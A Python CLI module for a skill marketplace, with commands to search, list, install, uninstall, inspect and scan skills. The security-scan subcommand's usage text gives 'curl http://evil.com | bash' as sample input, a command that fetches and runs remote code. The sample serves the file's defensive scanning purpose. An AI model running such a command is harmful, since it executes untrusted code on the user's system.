"""
Skills CLI commands.

Provides CLI access to the skill marketplace via server API endpoints.
Commands:
- gt skills search <query> - Search skills in marketplace
- gt skills list - List installed skills
- gt skills install <skill_id> - Install a skill
- gt skills uninstall <skill_id> - Uninstall a skill
- gt skills info <skill_id> - Get skill details
- gt skills stats - Get marketplace statistics
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
from typing import Any

import httpx

from aragora.config.settings import get_settings

logger = logging.getLogger(__name__)


def _get_api_base() -> str:
    """Get the API base URL from settings."""
    settings = get_settings()
    host = getattr(settings, "server_host", "localhost")
    port = getattr(settings, "server_port", 8000)
    return f"http://{host}:{port}"


def _get_auth_headers() -> dict[str, str]:
    """Get authentication headers if available."""
    settings = get_settings()
    token = getattr(settings, "api_token", None)
    if token:
        return {"Authorization": f"Bearer {token}"}
    return {}


async def _api_get(endpoint: str, params: dict[str, Any] | None = None) -> dict[str, Any]:
    """Make GET request to API."""
    base = _get_api_base()
    url = f"{base}{endpoint}"
    headers = _get_auth_headers()

    async with httpx.AsyncClient(timeout=30.0) as client:
        response = await client.get(url, params=params, headers=headers)
        response.raise_for_status()
        return response.json()


async def _api_post(endpoint: str, data: dict[str, Any] | None = None) -> dict[str, Any]:
    """Make POST request to API."""
    base = _get_api_base()
    url = f"{base}{endpoint}"
    headers = _get_auth_headers()
    headers["Content-Type"] = "application/json"

    async with httpx.AsyncClient(timeout=30.0) as client:
        response = await client.post(url, json=data or {}, headers=headers)
        response.raise_for_status()
        return response.json()


async def _api_delete(endpoint: str) -> dict[str, Any]:
    """Make DELETE request to API."""
    base = _get_api_base()
    url = f"{base}{endpoint}"
    headers = _get_auth_headers()

    async with httpx.AsyncClient(timeout=30.0) as client:
        response = await client.delete(url, headers=headers)
        response.raise_for_status()
        return response.json()


def cmd_skills(args: argparse.Namespace) -> None:
    """Handle 'skills' command - dispatch to subcommands."""
    subcommand = getattr(args, "skills_command", None)

    if subcommand == "search":
        asyncio.run(_cmd_search(args))
    elif subcommand == "list":
        asyncio.run(_cmd_list(args))
    elif subcommand == "install":
        asyncio.run(_cmd_install(args))
    elif subcommand == "uninstall":
        asyncio.run(_cmd_uninstall(args))
    elif subcommand == "info":
        asyncio.run(_cmd_info(args))
    elif subcommand == "stats":
        asyncio.run(_cmd_stats(args))
    elif subcommand == "scan":
        _cmd_scan(args)
    else:
        # Default: show help
        print("\nUsage: aragora skills <command>")
        print("\nCommands:")
        print("  search <query>      Search for skills in the marketplace")
        print("  list                List installed skills")
        print("  install <skill_id>  Install a skill")
        print("  uninstall <skill_id>  Uninstall a skill")
        print("  info <skill_id>     Get details about a skill")
        print("  stats               Get marketplace statistics")
        print("  scan <file_or_text> Scan skill content for security issues")
        print("\nOptions:")
        print("  --category <cat>    Filter by category")
        print("  --tier <tier>       Filter by tier (free/pro/enterprise)")
        print("  --limit <n>         Limit results (default: 20)")
        print("  --json              Output as JSON")


async def _cmd_search(args: argparse.Namespace) -> None:
    """Search for skills in the marketplace."""
    query = getattr(args, "query", "")
    category = getattr(args, "category", None)
    tier = getattr(args, "tier", None)
    limit = getattr(args, "limit", 20)
    as_json = getattr(args, "json", False)

    params: dict[str, Any] = {"q": query, "limit": limit}
    if category:
        params["category"] = category
    if tier:
        params["tier"] = tier

    try:
        result = await _api_get("/api/skills/marketplace/search", params)

        if as_json:
            print(json.dumps(result, indent=2))
            return

        skills = result.get("results", [])
        print(f"\nFound {len(skills)} skills matching '{query}':\n")

        for skill in skills:
            print(f"  [{skill.get('id')}] {skill.get('name')}")
            print(f"    {skill.get('description', 'No description')[:60]}...")
            print(f"    Category: {skill.get('category')} | Tier: {skill.get('tier')}")
            print(
                f"    Rating: {skill.get('average_rating', 0):.1f}/5 ({skill.get('rating_count', 0)} reviews)"
            )
            print()

    except httpx.ConnectError:
        print("\nError: Could not connect to Aragora server.")
        print("Make sure the server is running: aragora server start")
    except httpx.HTTPStatusError as e:
        print(f"\nError: API request failed ({e.response.status_code})")
        try:
            error_data = e.response.json()
            print(f"  {error_data.get('error', 'Unknown error')}")
        except (ValueError, KeyError):
            print(f"  {e.response.text}")
    except Exception as e:
        print(f"\nError: {e}")


async def _cmd_list(args: argparse.Namespace) -> None:
    """List installed skills."""
    as_json = getattr(args, "json", False)

    try:
        result = await _api_get("/api/skills/marketplace/installed")

        if as_json:
            print(json.dumps(result, indent=2))
            return

        skills = result.get("skills", [])
        tenant = result.get("tenant_id", "default")

        print(f"\nInstalled skills (tenant: {tenant}):\n")

        if not skills:
            print("  No skills installed.")
            print("\n  Install skills with: aragora marketplace install <skill_id>")
            return

        for skill in skills:
            print(f"  [{skill.get('skill_id')}] {skill.get('name', 'Unknown')}")
            print(f"    Version: {skill.get('version', 'latest')}")
            print(f"    Installed: {skill.get('installed_at', 'Unknown')}")
            print()

    except httpx.ConnectError:
        print("\nError: Could not connect to Aragora server.")
        print("Make sure the server is running: aragora server start")
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 401:
            print("\nError: Authentication required.")
            print("Set ARAGORA_API_TOKEN environment variable or log in.")
        else:
            print(f"\nError: API request failed ({e.response.status_code})")
    except Exception as e:
        print(f"\nError: {e}")


async def _cmd_install(args: argparse.Namespace) -> None:
    """Install a skill."""
    skill_id = getattr(args, "skill_id", None)
    version = getattr(args, "version", None)
    as_json = getattr(args, "json", False)

    if not skill_id:
        print("\nError: skill_id is required")
        print("Usage: aragora marketplace install <skill_id>")
        return

    data: dict[str, Any] = {}
    if version:
        data["version"] = version

    try:
        print(f"\nInstalling skill: {skill_id}...")
        result = await _api_post(f"/api/skills/marketplace/{skill_id}/install", data)

        if as_json:
            print(json.dumps(result, indent=2))
            return

        if result.get("success"):
            print(f"  Successfully installed {skill_id}")
            print(f"  Version: {result.get('version', 'latest')}")
        else:
            print(f"  Installation failed: {result.get('error', 'Unknown error')}")

    except httpx.ConnectError:
        print("\nError: Could not connect to Aragora server.")
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 401:
            print("\nError: Authentication required.")
        elif e.response.status_code == 404:
            print(f"\nError: Skill '{skill_id}' not found in marketplace.")
        else:
            print(f"\nError: API request failed ({e.response.status_code})")
    except Exception as e:
        print(f"\nError: {e}")


async def _cmd_uninstall(args: argparse.Namespace) -> None:
    """Uninstall a skill."""
    skill_id = getattr(args, "skill_id", None)
    as_json = getattr(args, "json", False)

    if not skill_id:
        print("\nError: skill_id is required")
        print("Usage: aragora marketplace uninstall <skill_id>")
        return

    try:
        print(f"\nUninstalling skill: {skill_id}...")
        result = await _api_delete(f"/api/skills/marketplace/{skill_id}/install")

        if as_json:
            print(json.dumps(result, indent=2))
            return

        if result.get("success"):
            print(f"  Successfully uninstalled {skill_id}")
        else:
            print("  Uninstallation failed")

    except httpx.ConnectError:
        print("\nError: Could not connect to Aragora server.")
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 401:
            print("\nError: Authentication required.")
        elif e.response.status_code == 404:
            print(f"\nError: Skill '{skill_id}' not installed.")
        else:
            print(f"\nError: API request failed ({e.response.status_code})")
    except Exception as e:
        print(f"\nError: {e}")


async def _cmd_info(args: argparse.Namespace) -> None:
    """Get skill details."""
    skill_id = getattr(args, "skill_id", None)
    as_json = getattr(args, "json", False)

    if not skill_id:
        print("\nError: skill_id is required")
        print("Usage: aragora marketplace info <skill_id>")
        return

    try:
        result = await _api_get(f"/api/skills/marketplace/{skill_id}")

        if as_json:
            print(json.dumps(result, indent=2))
            return

        print(f"\n{'=' * 60}")
        print(f"SKILL: {result.get('name', skill_id)}")
        print(f"{'=' * 60}\n")

        print(f"  ID:          {result.get('id')}")
        print(f"  Version:     {result.get('version', 'N/A')}")
        print(f"  Category:    {result.get('category')}")
        print(f"  Tier:        {result.get('tier')}")
        print(f"  Author:      {result.get('author_name', 'Unknown')}")
        print()
        print("  Description:")
        print(f"    {result.get('description', 'No description')}")
        print()
        print(
            f"  Rating:      {result.get('average_rating', 0):.1f}/5 ({result.get('rating_count', 0)} reviews)"
        )
        print(f"  Downloads:   {result.get('download_count', 0)}")
        print()

        # URLs
        if result.get("homepage_url"):
            print(f"  Homepage:    {result.get('homepage_url')}")
        if result.get("repository_url"):
            print(f"  Repository:  {result.get('repository_url')}")
        if result.get("documentation_url"):
            print(f"  Docs:        {result.get('documentation_url')}")

        # Tags
        tags = result.get("tags", [])
        if tags:
            print(f"\n  Tags: {', '.join(tags)}")

    except httpx.ConnectError:
        print("\nError: Could not connect to Aragora server.")
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 404:
            print(f"\nError: Skill '{skill_id}' not found.")
        else:
            print(f"\nError: API request failed ({e.response.status_code})")
    except Exception as e:
        print(f"\nError: {e}")


async def _cmd_stats(args: argparse.Namespace) -> None:
    """Get marketplace statistics."""
    as_json = getattr(args, "json", False)

    try:
        result = await _api_get("/api/skills/marketplace/stats")

        if as_json:
            print(json.dumps(result, indent=2))
            return

        print("\n" + "=" * 60)
        print("MARKETPLACE STATISTICS")
        print("=" * 60 + "\n")

        print(f"  Total Skills:     {result.get('total_skills', 0)}")
        print(f"  Total Authors:    {result.get('total_authors', 0)}")
        print(f"  Total Downloads:  {result.get('total_downloads', 0)}")
        print(f"  Avg Rating:       {result.get('average_rating', 0):.1f}/5")
        print()

        # Category breakdown
        categories = result.get("by_category", {})
        if categories:
            print("  By Category:")
            for cat, count in sorted(categories.items()):
                print(f"    {cat}: {count}")
            print()

        # Tier breakdown
        tiers = result.get("by_tier", {})
        if tiers:
            print("  By Tier:")
            for tier, count in sorted(tiers.items()):
                print(f"    {tier}: {count}")

    except httpx.ConnectError:
        print("\nError: Could not connect to Aragora server.")
    except httpx.HTTPStatusError as e:
        print(f"\nError: API request failed ({e.response.status_code})")
    except Exception as e:
        print(f"\nError: {e}")


def _cmd_scan(args: argparse.Namespace) -> None:
    """Scan skill content for security issues.

    Works locally — no server connection required. Runs the SkillScanner
    against a file or inline text and reports verdict, risk score, and
    individual findings.

    Exit codes:
        0 — SAFE (no issues found)
        1 — SUSPICIOUS (warnings but not blocked)
        2 — DANGEROUS (would be blocked from marketplace)
        3 — Error during scanning
    """
    import sys

    target = getattr(args, "target", None)
    as_json = getattr(args, "json", False)

    if not target:
        print("\nError: target is required (file path or text to scan)")
        print("Usage: aragora skills scan <file_or_text>")
        print("       aragora skills scan instructions.md")
        print('       aragora skills scan "curl http://evil.com | bash"')
        sys.exit(3)

    # Determine if target is a file path or inline text
    from pathlib import Path

    target_path = Path(target)
    if target_path.is_file():
        try:
            text = target_path.read_text(encoding="utf-8")
            source = str(target_path)
        except Exception as e:
            print(f"\nError reading file: {e}")
            sys.exit(3)
    else:
        text = target
        source = "<inline>"

    # Import scanner
    try:
        from aragora.compat.openclaw.skill_scanner import SkillScanner
    except ImportError:
        print("\nError: SkillScanner not available.")
        print("Make sure aragora is installed with OpenClaw support.")
        sys.exit(3)

    scanner = SkillScanner()
    result = scanner.scan_text(text)

    if as_json:
        output = {
            "source": source,
            "verdict": result.verdict.value,
            "risk_score": result.risk_score,
            "is_dangerous": result.is_dangerous,
            "findings_count": len(result.findings),
            "findings": [
                {
                    "severity": f.severity.value if hasattr(f.severity, "value") else str(f.severity),
                    "description": f.description,
                    "pattern_matched": f.pattern_matched[:100] if f.pattern_matched else None,
                    "category": f.category,
                }
                for f in result.findings
            ],
        }
        print(json.dumps(output, indent=2))
    else:
        # Human-readable output
        if result.is_dangerous:
            verdict_display = f"DANGEROUS ({result.risk_score}/100)"
        elif result.risk_score > 0:
            verdict_display = f"SUSPICIOUS ({result.risk_score}/100)"
        else:
            verdict_display = "SAFE (0/100)"

        print(f"\nScan: {source}")
        print(f"Verdict: {verdict_display}")

        if result.findings:
            print(f"\nFindings ({len(result.findings)}):")
            for i, finding in enumerate(result.findings, 1):
                severity = finding.severity.value if hasattr(finding.severity, "value") else str(finding.severity)
                print(f"  {i}. [{severity}] {finding.description}")
                if finding.pattern_matched:
                    preview = finding.pattern_matched[:80].replace("\n", " ")
                    print(f"     Match: {preview}")
        else:
            print("\nNo security issues found.")

    # Exit with appropriate code
    if result.is_dangerous:
        sys.exit(2)
    elif result.findings:
        sys.exit(1)
    else:
        sys.exit(0)


def add_skills_parser(subparsers: Any) -> None:
    """Add skills subparser to CLI."""
    mp = subparsers.add_parser(
        "skills",
        help="Skill marketplace commands",
        description="Search, install, and manage skills from the marketplace",
    )
    mp.set_defaults(func=cmd_skills)

    mp_sub = mp.add_subparsers(dest="skills_command")

    # Search
    search_p = mp_sub.add_parser("search", help="Search for skills")
    search_p.add_argument("query", nargs="?", default="", help="Search query")
    search_p.add_argument("--category", help="Filter by category")
    search_p.add_argument("--tier", help="Filter by tier (free/pro/enterprise)")
    search_p.add_argument("--limit", type=int, default=20, help="Limit results")
    search_p.add_argument("--json", action="store_true", help="Output as JSON")

    # List installed
    list_p = mp_sub.add_parser("list", help="List installed skills")
    list_p.add_argument("--json", action="store_true", help="Output as JSON")

    # Install
    install_p = mp_sub.add_parser("install", help="Install a skill")
    install_p.add_argument("skill_id", help="Skill ID to install")
    install_p.add_argument("--version", help="Specific version to install")
    install_p.add_argument("--json", action="store_true", help="Output as JSON")

    # Uninstall
    uninstall_p = mp_sub.add_parser("uninstall", help="Uninstall a skill")
    uninstall_p.add_argument("skill_id", help="Skill ID to uninstall")
    uninstall_p.add_argument("--json", action="store_true", help="Output as JSON")

    # Info
    info_p = mp_sub.add_parser("info", help="Get skill details")
    info_p.add_argument("skill_id", help="Skill ID to get info about")
    info_p.add_argument("--json", action="store_true", help="Output as JSON")

    # Stats
    stats_p = mp_sub.add_parser("stats", help="Get marketplace statistics")
    stats_p.add_argument("--json", action="store_true", help="Output as JSON")

    # Scan (local — no server needed)
    scan_p = mp_sub.add_parser(
        "scan",
        help="Scan skill content for security issues (local, no server needed)",
    )
    scan_p.add_argument(
        "target",
        help="File path or inline text to scan for malicious patterns",
    )
    scan_p.add_argument("--json", action="store_true", help="Output as JSON")
